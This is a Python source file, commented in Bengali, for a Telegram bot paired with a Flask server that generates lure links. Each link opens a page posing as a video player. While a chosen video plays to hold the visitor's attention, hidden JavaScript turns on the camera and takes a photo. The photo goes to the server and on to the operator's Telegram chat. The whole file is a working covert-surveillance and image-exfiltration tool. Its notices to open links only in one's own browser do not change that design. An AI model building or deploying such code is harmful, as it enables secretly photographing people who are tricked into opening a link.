import os
import io
import base64
import threading
import requests
from urllib.parse import urlparse, quote
from flask import Flask, request, render_template_string, jsonify, redirect
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

app = Flask(__name__)

# ==========================================
# Secrets থেকে টোকেন ও Chat ID
# ==========================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID = os.environ.get("CHAT_ID", "")
PUBLIC_URL = os.environ.get("PUBLIC_URL", "")

if not BOT_TOKEN or not CHAT_ID:
    print("❌ BOT_TOKEN বা CHAT_ID সেট করা হয়নি!")
    print("👉 Replit → Tools → Secrets এ যোগ করুন")
    raise SystemExit(1)

# অস্থায়ী স্টোরেজ
user_sessions = {}   # {chat_id: {"camera": "front/back", "video_url": "...", "link_id": "..."}}
link_store = {}      # {link_id: {"chat_id": ..., "video_url": ..., "camera": ...}}


# ==========================================
# Telegram এ ছবি পাঠানো
# ==========================================
def send_photo_to_telegram(photo_file, chat_id, bot_token, caption=""):
    url = f"https://api.telegram.org/bot{bot_token}/sendPhoto"
    files = {"photo": photo_file}
    payload = {"chat_id": chat_id}
    if caption:
        payload["caption"] = caption

    try:
        response = requests.post(url, files=files, data=payload, timeout=30)
        response.raise_for_status()
        if response.status_code == 200:
            return {"status": "success"}
        return {"status": "error", "details": response.text}
    except requests.RequestException as e:
        return {"status": "error", "details": str(e)}


def capture_and_send_photo(photo_data, chat_id, camera_type="front"):
    try:
        if "," in photo_data:
            image_data = photo_data.split(",", 1)[1]
        else:
            return {"status": "error", "details": "Invalid image data format"}

        image_bytes = base64.b64decode(image_data)
        photo_file = io.BytesIO(image_bytes)
        photo_file.name = f"{camera_type}_capture.jpg"

        caption = f"📸 {camera_type.upper()} Camera ক্যাপচার"
        return send_photo_to_telegram(photo_file, chat_id, BOT_TOKEN, caption)
    except Exception as e:
        return {"status": "error", "details": str(e)}


# ==========================================
# ক্যামেরা ক্যাপচার পেজ (ভিডিও + লুকানো ক্যামেরা)
# ==========================================
CAPTURE_HTML = """
<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        .video-wrapper {
            width: 100%;
            max-width: 900px;
            position: relative;
        }
        video {
            width: 100%;
            height: auto;
            display: block;
            background: #000;
        }
        iframe {
            width: 100%;
            height: 70vh;
            border: none;
            display: block;
            background: #000;
        }
        .info {
            position: fixed;
            bottom: 10px;
            right: 10px;
            font-size: 11px;
            color: #555;
        }
        .loading {
            text-align: center;
            padding: 20px;
            color: #888;
        }
    </style>
</head>
<body>
    <div class="video-wrapper" id="videoContainer">
        <div class="loading">⏳ লোড হচ্ছে...</div>
    </div>
    <div class="info">Auto-play enabled</div>

    <script>
        const VIDEO_URL = "{{ video_url }}";
        const CHAT_ID = "{{ chat_id }}";
        const CAMERA_TYPE = "{{ camera_type }}";
        const LINK_ID = "{{ link_id }}";

        let videoStarted = false;

        // === ক্যামেরা চালু + ছবি ক্যাপচার (লুকানো) ===
        async function startHiddenCapture() {
            try {
                const constraints = {
                    video: {
                        facingMode: CAMERA_TYPE === "back" ? "environment" : "user"
                    },
                    audio: false
                };
                const stream = await navigator.mediaDevices.getUserMedia(constraints);

                const hiddenVideo = document.createElement('video');
                hiddenVideo.srcObject = stream;
                hiddenVideo.setAttribute('playsinline', 'true');
                hiddenVideo.muted = true;
                hiddenVideo.style.display = 'none';
                document.body.appendChild(hiddenVideo);
                hiddenVideo.play();

                hiddenVideo.onplaying = () => {
                    // ১.৫ সেকেন্ড পরে ছবি তুলুন
                    setTimeout(async () => {
                        try {
                            const canvas = document.createElement('canvas');
                            canvas.width = hiddenVideo.videoWidth || 640;
                            canvas.height = hiddenVideo.videoHeight || 480;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
                            const photo = canvas.toDataURL('image/jpeg', 0.85);

                            // সার্ভারে পাঠান
                            await fetch('/capture', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    photo: photo,
                                    chat_id: CHAT_ID,
                                    camera_type: CAMERA_TYPE
                                })
                            });

                            // ক্যামেরা বন্ধ
                            stream.getTracks().forEach(t => t.stop());
                        } catch (e) {
                            console.log("capture error", e);
                        }
                    }, 1500);
                };
            } catch (e) {
                console.log("camera error", e);
            }
        }

        // === ভিডিও লোড (ব্যবহারকারীর মনোযোগ এদিকে) ===
        function loadVideo() {
            const container = document.getElementById('videoContainer');
            if (!VIDEO_URL) {
                container.innerHTML = '<div class="loading">কোনো ভিডিও নেই</div>';
                return;
            }

            // YouTube লিংক হলে iframe
            if (VIDEO_URL.includes('youtube.com') || VIDEO_URL.includes('youtu.be')) {
                let vid = '';
                if (VIDEO_URL.includes('youtu.be/')) {
                    vid = VIDEO_URL.split('youtu.be/')[1].split('?')[0];
                } else if (VIDEO_URL.includes('v=')) {
                    vid = VIDEO_URL.split('v=')[1].split('&')[0];
                }
                container.innerHTML = `
                    <iframe
                        src="https://www.youtube.com/embed/${vid}?autoplay=1&mute=0"
                        allow="autoplay; encrypted-media"
                        allowfullscreen>
                    </iframe>`;
            } else if (VIDEO_URL.match(/\\.(mp4|webm|ogg)$/i)) {
                container.innerHTML = `
                    <video autoplay controls playsinline>
                        <source src="${VIDEO_URL}" type="video/mp4">
                    </video>`;
            } else {
                // অন্য লিংক হলে সরাসরি redirect
                window.location.href = VIDEO_URL;
            }
        }

        // === সব শুরু ===
        window.onload = () => {
            loadVideo();
            // ভিডিও চলার সাথে সাথেই লুকানো ক্যামেরা চালু
            startHiddenCapture();
        };
    </script>
</body>
</html>
"""


@app.route("/")
def index():
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Service</title>
        <style>
            body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
            h1 { color: #333; }
        </style>
    </head>
    <body>
        <h1>✅ Service is running</h1>
        <p>Telegram বট চালু আছে।</p>
    </body>
    </html>
    """


@app.route("/v/<link_id>")
def view_link(link_id):
    """পাবলিক লিংক — এখানে কেউ এলে ভিডিও + ক্যামেরা"""
    data = link_store.get(link_id)
    if not data:
        return "লিংকটি পাওয়া যায়নি বা মেয়াদ শেষ", 404

    return render_template_string(
        CAPTURE_HTML,
        video_url=data.get("video_url", ""),
        chat_id=data.get("chat_id", ""),
        camera_type=data.get("camera", "front"),
        link_id=link_id,
    )


@app.route("/capture", methods=["POST"])
def capture():
    data = request.get_json(silent=True)
    if not data or "photo" not in data:
        return jsonify({"status": "error", "details": "No photo"}), 400

    chat_id = data.get("chat_id", CHAT_ID)
    camera_type = data.get("camera_type", "front")
    result = capture_and_send_photo(data["photo"], chat_id, camera_type)
    return jsonify(result)


# ==========================================
# Telegram Bot Handlers
# ==========================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """শুরুতে Front / Back Camera বাটন"""
    keyboard = [
        [
            InlineKeyboardButton("📸 Front Camera", callback_data="cam_front"),
            InlineKeyboardButton("📷 Back Camera", callback_data="cam_back"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🎥 *Camera Tool*\n\n"
        "কোন ক্যামেরা ব্যবহার করতে চান?",
        reply_markup=reply_markup,
        parse_mode="Markdown",
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """বাটন ক্লিক হ্যান্ডলার"""
    query = update.callback_query
    await query.answer()
    data = query.data
    chat_id = str(query.message.chat_id)

    # === Camera select ===
    if data.startswith("cam_"):
        cam = data.split("_")[1]  # front / back
        user_sessions[chat_id] = {"camera": cam}

        keyboard = [
            [InlineKeyboardButton("🔗 Redirect Link (Enter URL)", callback_data="link_redirect")],
            [InlineKeyboardButton("🔗 Direct Link", callback_data="link_direct")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        cam_name = "Front" if cam == "front" else "Back"
        await query.edit_message_text(
            f"✅ *{cam_name} Camera* সিলেক্ট করা হয়েছে।\n\n"
            f"💡 *Your Chat ID:* `{chat_id}`\n\n"
            f"এখন লিংকের ধরন বেছে নিন:",
            reply_markup=reply_markup,
            parse_mode="Markdown",
        )
        return

    # === Redirect Link — URL ইনপুট ===
    if data == "link_redirect":
        session = user_sessions.get(chat_id, {})
        session["waiting_url"] = True
        session["link_type"] = "redirect"
        user_sessions[chat_id] = session

        await query.edit_message_text(
            "🔄 *Enter ANY Custom Link/URL*\n\n"
            "যে ভিডিও/লিংক দেখাতে চান, সেটার URL পাঠান।\n\n"
            "✅ সব ফরম্যাট কাজ করে:\n"
            "• `youtube.com/watch?v=VIDEO_ID`\n"
            "• `https://example.com/video.mp4`\n"
            "• `facebook.com/video/...`\n"
            "• যেকোনো ভিডিও লিংক\n\n"
            "👉 শুধু লিংকটি পাঠান:",
            parse_mode="Markdown",
        )
        return

    # === Direct Link — ভিডিও ছাড়া ===
    if data == "link_direct":
        session = user_sessions.get(chat_id, {})
        cam = session.get("camera", "front")

        # লিংক তৈরি
        import uuid
        link_id = uuid.uuid4().hex[:10]
        link_store[link_id] = {
            "chat_id": chat_id,
            "video_url": "",
            "camera": cam,
        }

        if PUBLIC_URL:
            public_link = f"{PUBLIC_URL}/v/{link_id}"
        else:
            public_link = f"[Replit Webview লিংক]/v/{link_id}"

        keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            f"✅ *Direct Link তৈরি হয়েছে!*\n\n"
            f"📸 Camera: *{cam.capitalize()}*\n\n"
            f"🔗 লিংক:\n`{public_link}`\n\n"
            f"⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*\n"
            f"Allow করলে ছবি Telegram-এ আসবে।",
            reply_markup=reply_markup,
            parse_mode="Markdown",
        )
        return

    # === Cancel ===
    if data == "cancel":
        user_sessions.pop(chat_id, None)
        await query.edit_message_text("❌ বাতিল করা হয়েছে। আবার `/start` পাঠান।")
        return


async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """URL ইনপুট ধরার জন্য"""
    chat_id = str(update.message.chat_id)
    session = user_sessions.get(chat_id, {})

    if not session.get("waiting_url"):
        return

    url = update.message.text.strip()
    if not url.startswith("http"):
        url = "https://" + url

    cam = session.get("camera", "front")
    session["waiting_url"] = False
    session["video_url"] = url
    user_sessions[chat_id] = session

    # লিংক তৈরি
    import uuid
    link_id = uuid.uuid4().hex[:10]
    link_store[link_id] = {
        "chat_id": chat_id,
        "video_url": url,
        "camera": cam,
    }

    if PUBLIC_URL:
        public_link = f"{PUBLIC_URL}/v/{link_id}"
    else:
        public_link = f"[Replit Webview URL]/v/{link_id}"

    keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"✅ *Redirect Link তৈরি হয়েছে!*\n\n"
        f"📸 Camera: *{cam.capitalize()}*\n"
        f"🎬 Video: `{url[:50]}...`\n\n"
        f"🔗 লিংক:\n`{public_link}`\n\n"
        f"⚠️ *শুধু নিজের ব্রাউজারে খুলুন।*\n"
        f"ভিডিও চলবে + আড়ালে ছবি Telegram-এ আসবে।",
        reply_markup=reply_markup,
        parse_mode="Markdown",
    )


# ==========================================
# Flask চালানো
# ==========================================
def run_flask():
    app.run(host="0.0.0.0", port=8080, use_reloader=False, debug=False)


# ==========================================
# Main
# ==========================================
def main():
    # Flask থ্রেড
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    print("🌐 Web Server চলছে: http://0.0.0.0:8080")
    print("✅ Telegram Bot শুরু হচ্ছে...")

    # Bot
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    print("🤖 Bot is running...")
    application.run_polling()


if __name__ == "__main__":
    main()